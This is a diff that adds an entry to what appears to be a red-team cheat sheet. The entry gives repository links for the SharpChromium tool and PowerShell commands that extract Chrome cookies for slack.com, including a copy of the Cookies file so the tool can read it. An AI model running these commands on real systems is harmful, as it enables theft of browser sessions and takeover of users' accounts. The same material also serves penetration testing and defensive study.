@@ -3310,6 +3310,16 @@ https://github.com/GhostPack/SharpDPAPI
 C:\> .\SharpChrome.exe logins /unprotect
 ```
 
+- SharpChromium
+
+```
+https://github.com/djhohnstein/SharpChromium
+https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpChromium.ps1
+PS C:\> Invoke-SharpChromium -Command "cookies slack.com"
+PS C:\> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+PS C:\> Invoke-SharpChromium -Command "cookies slack.com"
+```
+
 - Firefox_decrypt
 
 ```
